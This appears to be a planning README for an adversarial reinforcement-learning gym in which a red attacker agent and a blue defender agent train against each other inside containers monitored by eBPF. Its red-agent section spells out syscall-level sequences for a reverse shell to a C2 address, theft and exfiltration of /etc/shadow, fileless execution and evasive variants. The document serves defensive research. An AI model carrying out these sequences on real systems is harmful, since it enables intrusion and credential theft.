# InnerWarden Gym

Adversarial reinforcement learning for autonomous security. Two agents (red attacker, blue defender) play against each other inside a real Linux environment with InnerWarden sensors active. The blue agent learns to detect and respond to attacks faster and more accurately than any rule-based system or external LLM.

**Status**: Planning / Documentation phase

---

## Why this works

Traditional security AI trains on logs (text classification). That is like learning to drive by reading accident reports.

InnerWarden Gym trains on live syscalls inside a real kernel. The red agent executes real connect(), open(), dup2() sequences. The blue agent reads real eBPF events and decides real responses (block, kill, isolate). Reward comes from real detector outputs. This is like learning to drive in a real car.

The moat: the model is only as good as the sensors that trained it. Without 48 detectors + 38 eBPF hooks + firmware probes + honeypot + baseline generating the training data, a competitor's model would be blind. The value is not in the model weights. It is in the training environment.

---

## Architecture

```
┌─────────────────────────────────────────────────────────┐
│                    TRAINING LOOP                         │
│                                                          │
│   ┌──────────┐         ┌──────────┐                     │
│   │ Red Agent │ ←─────→ │ Blue Agent│                    │
│   │ (attacker)│  plays  │ (defender)│                    │
│   │ PPO/SAC   │ against │ PPO/SAC   │                    │
│   └─────┬────┘         └─────┬────┘                     │
│         │                     │                          │
│         │ executes syscalls   │ reads sensors            │
│         │                     │ picks actions            │
│         ▼                     ▼                          │
│   ┌──────────────────────────────────────────┐           │
│   │           CONTAINER ENVIRONMENT           │           │
│   │                                           │           │
│   │  InnerWarden Sensor (all 48 detectors)    │           │
│   │  InnerWarden Agent (all skills)           │           │
│   │  eBPF hooks (38 active)                   │           │
│   │  Filesystem, network, processes           │           │
│   │                                           │           │
│   │  Observation: sensor state vector          │           │
│   │  Actions: block_ip, kill_process, etc.    │           │
│   │  Reward: detection speed + accuracy       │           │
│   └──────────────────────────────────────────┘           │
│                                                          │
│   Episode: red attacks → blue responds → score           │
│   Reset: fresh container, new episode                    │
│   Self-play: red gets smarter, blue adapts               │
└─────────────────────────────────────────────────────────┘
```

---

## Observation Space (what the blue agent sees)

Everything the InnerWarden sensor produces, compressed into a fixed-size vector:

| Feature | Dimensions | Source |
|---------|-----------|--------|
| Event rate per collector (20 collectors) | 20 | telemetry |
| Active incidents by severity (4 levels) | 4 | incident pipeline |
| Detector fire counts (top 20 detectors) | 20 | telemetry |
| Network connection count (inbound/outbound) | 2 | eBPF connect/accept |
| Process count delta (from baseline) | 1 | proc_maps |
| File modification count (sensitive paths) | 1 | fanotify |
| CPU usage (total) | 1 | cgroup |
| Memory usage (total) | 1 | cgroup |
| Privilege escalation events (last 60s) | 1 | eBPF commit_creds |
| Kernel module load events (last 60s) | 1 | eBPF init_module |
| Correlation chains active | 1 | correlation_engine |
| Baseline anomaly score | 1 | baseline |
| DNS query rate | 1 | eBPF connect (port 53) |
| Outbound connection rate | 1 | eBPF connect |
| File read rate (sensitive paths) | 1 | eBPF openat |
| **Total** | **57** | |

This is a 57-dimensional float vector updated every 2 seconds (the agent fast loop interval).

---

## Action Space (what the blue agent can do)

Discrete actions mapping to real InnerWarden skills:

| Action ID | Skill | Effect |
|-----------|-------|--------|
| 0 | **do_nothing** | Wait and observe (valid action, not always wrong) |
| 1 | **block_ip** | XDP wire-speed drop for the primary incident IP |
| 2 | **kill_process** | Terminate the process tree for the incident PID |
| 3 | **suspend_sudo** | Revoke sudo for the incident user |
| 4 | **isolate_network** | Drop all traffic except SSH from admin IP |
| 5 | **deploy_honeypot** | Redirect attacker to fake environment |
| 6 | **capture_forensics** | Snapshot /proc state for the incident PID |
| 7 | **escalate** | Mark incident as requiring human review |

8 possible actions. The agent picks one per decision step.

---

## Reward Function (how the blue agent is scored)

```
reward = detection_reward + response_reward + uptime_penalty + false_positive_penalty

detection_reward:
  +10  if attack detected within 10 seconds
  +5   if attack detected within 60 seconds
  +1   if attack detected at all
  0    if attack not detected

response_reward:
  +5   if correct response (block for brute force, kill for reverse shell)
  +2   if any response that stops the attack
  -2   if response does not stop the attack

uptime_penalty:
  -1   per second of legitimate service downtime caused by response
  -10  if isolate_network when no attack is happening

false_positive_penalty:
  -5   per false positive block/kill
  -20  if legitimate user locked out
```

The reward function teaches the agent to detect fast, respond correctly, and avoid collateral damage. It naturally learns that doing nothing is sometimes the right choice (for Low severity events that do not warrant action).

---

## Red Agent (attacker)

### Attack Techniques (from MITRE ATT&CK)

The red agent picks from a library of attack sequences. Each sequence is a series of real syscalls executed inside the container.

**Level 1: Basic attacks (weeks 1-2)**

These are the attacks the honeypot captures every day. Simple, well-known, easy for blue to learn against.

```
BRUTE_FORCE:
  1. connect(target_ip, 22)        # SSH connection
  2. write(fd, "root\n")           # Username
  3. write(fd, "admin123\n")       # Password
  4. repeat 50 times               # Multiple attempts

  Success: login accepted
  Reward: +1 per successful auth

REVERSE_SHELL:
  1. socket(AF_INET, SOCK_STREAM)  # Create socket
  2. connect(c2_ip, 4444)          # Connect to C2
  3. dup2(sock_fd, 0)              # Redirect stdin
  4. dup2(sock_fd, 1)              # Redirect stdout
  5. execve("/bin/sh")             # Spawn shell

  Success: shell connected to C2
  Reward: +5 (high value target)

DATA_EXFILTRATION:
  1. open("/etc/shadow", O_RDONLY)  # Read sensitive file
  2. read(fd, buffer, 4096)        # Read contents
  3. socket(AF_INET, SOCK_STREAM)  # Create socket
  4. connect(exfil_ip, 443)        # Connect outbound
  5. write(sock_fd, buffer)        # Send data

  Success: data leaves the host
  Reward: +10 (critical)
```

**Level 2: Evasive attacks (weeks 3-4)**

Red agent learns to modify timing, encoding, and technique order to evade blue.

```
SLOW_BRUTE_FORCE:
  Same as BRUTE_FORCE but 1 attempt per 5 minutes
  (below typical detector threshold)

ENCRYPTED_EXFIL:
  Same as DATA_EXFILTRATION but through DNS queries
  (data encoded in subdomain labels)

FILELESS_EXECUTION:
  1. memfd_create("", MFD_CLOEXEC)  # Create anonymous file
  2. write(memfd, elf_payload)       # Write payload to memory
  3. fexecve(memfd)                  # Execute from memory
  (no file on disk for YARA to scan)

STAGED_REVERSE_SHELL:
  1. Download payload in 3 parts via separate HTTP GETs
  2. Reassemble in /dev/shm
  3. Execute with 30 second delay
  (breaks temporal correlation)
```

**Level 3: Advanced attacks (weeks 5+)**

Red agent chains techniques from the 23 correlation rules.

```
CL-002_CHAIN (Recon → Access → Exfil):
  Phase 1: port scan target (slow, 1 port per 10 seconds)
  Phase 2: brute force discovered SSH
  Phase 3: read /etc/shadow + exfiltrate
  (tests whether blue can correlate the 3 phases)

CL-006_FILELESS:
  Phase 1: memfd_create
  Phase 2: mprotect(RWX)
  Phase 3: connect to C2
  (tests whether blue detects the eBPF sequence)
```

### How new attacks are generated

1. **From honeypot**: every real attacker session captured in production becomes a replay script for the red agent
2. **From mutation**: red agent takes a known attack and mutates it (change timing, encoding, port, protocol)
3. **From RL**: after training, the red agent discovers new attack sequences that evade the blue agent. These are logged and analyzed for novel evasion techniques

---

## Training Process

### Hardware Requirements

| Component | Minimum | Recommended |
|-----------|---------|-------------|
| CPU | 4 cores (i5) | 8+ cores |
| RAM | 8 GB | 16 GB |
| Disk | 50 GB SSD | 100 GB SSD |
| GPU | Not needed (Phase 1-2) | T4/A10 (Phase 3 only) |
| OS | Ubuntu 22.04 Server | Same |
| Kernel | 5.8+ (for eBPF) | 5.15+ (for BTF) |

### Phase 1: Environment Setup (week 1)

Goal: a single episode runs end-to-end.

1. Install Ubuntu Server 22.04 on the notebook
2. Install Docker + configure container networking
3. Build InnerWarden from source (sensor + agent)
4. Create the Gymnasium wrapper (`innerwarden-gym` Python package)
5. Verify: red executes a reverse shell, blue detects it, reward is computed

Deliverable: `python -c "import innerwarden_gym; env = innerwarden_gym.make(); obs = env.reset(); print(obs.shape)"` prints `(57,)`

### Phase 2: Baseline Training (weeks 2-4)

Goal: blue agent outperforms random policy.

1. Red agent uses Level 1 attacks (scripted, not learning yet)
2. Blue agent trains via PPO (Proximal Policy Optimization)
3. 500 episodes per day, 15,000 total
4. Metrics: detection rate, mean time to detect, false positive rate

Deliverable: blue agent detects >90% of Level 1 attacks with <5% false positives

### Phase 3: Self-Play (weeks 5-8)

Goal: both agents improve together.

1. Red agent starts learning via PPO (adversarial)
2. Red and blue train alternately (1000 red episodes, then 1000 blue episodes)
3. Red agent explores Level 2 and Level 3 techniques
4. Blue agent adapts to evasion

Deliverable: blue agent detects >80% of Level 2 attacks, >60% of Level 3

### Phase 4: Model Export (week 9)

Goal: replace external LLM with local model.

1. Export blue agent policy as ONNX model (~50MB)
2. Integrate ONNX runtime into InnerWarden agent (Rust)
3. A/B test: local model vs GPT-4o-mini on real production incidents
4. Measure: accuracy, latency (<1ms vs ~2s), cost ($0 vs $0.01/decision)

Deliverable: `innerwarden-agent --ai-provider local --model blue-agent-v1.onnx`

---

## File Structure

```
innerwarden-gym/
  README.md              # This file
  setup.py               # Python package
  innerwarden_gym/
    __init__.py
    env.py               # Gymnasium environment wrapper
    observation.py       # Observation space builder (reads sensor state)
    reward.py            # Reward function
    red_agent/
      __init__.py
      attacks.py         # Attack technique library
      replay.py          # Replay honeypot sessions as attacks
      mutator.py         # Mutate attacks for evasion
    blue_agent/
      __init__.py
      policy.py          # PPO policy network
      export.py          # Export to ONNX
  scripts/
    train_blue.py        # Train blue agent against scripted red
    train_selfplay.py    # Self-play training loop
    evaluate.py          # Benchmark blue agent
    replay_honeypot.py   # Convert honeypot sessions to attack scripts
  configs/
    training.toml        # Hyperparameters
    attacks.toml         # Attack technique definitions
```

---

## Dependencies

Python side (training):
- `gymnasium` (environment interface)
- `stable-baselines3` (PPO/SAC implementations)
- `torch` (neural network, CPU only for Phase 1-2)
- `onnx` + `onnxruntime` (model export)
- `docker` (Python SDK for container management)

Rust side (integration):
- `ort` crate (ONNX Runtime for Rust, inference only)
- No other new dependencies

---

## Key Decisions

**Why PPO and not DQN?**
PPO handles continuous observation spaces naturally and is more stable with sparse rewards. DQN would need discretization of the 57-dim observation space.

**Why not train on GPU from the start?**
The bottleneck is episode generation (running real syscalls), not gradient computation. A GPU would idle 95% of the time waiting for episodes to complete. CPU is the right tool until Phase 3 when the model gets larger.

**Why containers and not VMs?**
Containers share the host kernel, so eBPF hooks in the host see all container syscalls. VMs would need a separate eBPF deployment per VM. Containers are also 100x faster to reset between episodes.

**Why ONNX for export?**
ONNX Runtime has a mature Rust crate (`ort`). The model runs as a single function call: `input tensor → action probabilities`. No Python needed in production.

**Why 57 dimensions?**
This is the minimal observation that captures the full state of what InnerWarden sees. Adding more dimensions (raw events) would slow training without improving decisions. The 48 detectors already compress raw events into meaningful signals.

---

## Success Metrics

| Metric | Current (LLM) | Target (Local Model) |
|--------|---------------|---------------------|
| Decision latency | ~2000ms | <1ms |
| Cost per decision | $0.01 | $0.00 |
| Internet required | Yes | No |
| Detection rate (Level 1) | ~95% | >95% |
| Detection rate (Level 2) | ~70% | >85% |
| Detection rate (Level 3) | ~40% | >70% |
| False positive rate | ~8% | <5% |
| Model size | N/A (API) | ~50MB |

The local model should match or beat the LLM on common attacks (Level 1-2) and significantly outperform on novel/evasive attacks (Level 3) because it trained against them via self-play. The LLM has never seen these attack patterns.

---

## Timeline

| Week | Milestone |
|------|-----------|
| 1 | Ubuntu installed, InnerWarden building, first episode runs |
| 2 | Gymnasium wrapper complete, random blue agent baseline |
| 3-4 | Blue agent trains against Level 1, hits 90% detection |
| 5-6 | Self-play begins, red learns Level 2 evasion |
| 7-8 | Self-play with Level 3, blue adapts to chains |
| 9 | ONNX export, integration test in InnerWarden |
| 10 | A/B test on production server vs GPT-4o-mini |

---

## Patent Claim

"System and method for training adversarial security response models using multi-layer kernel telemetry spanning firmware through userspace as observation space, with automated security response actions as action space, trained via self-play between attacker and defender agents executing real system calls in isolated containerized environments."

Key differentiators from prior art (CAGE, CybORG, Yawning Titan):
- Real syscalls, not simulated
- Firmware (Ring -2) in observation space
- 48 detector reward signals, not simplified binary
- Honeypot data as attacker curriculum
- Behavioral DNA as attacker feature vector
- Cross-layer correlation rules as chain supervision
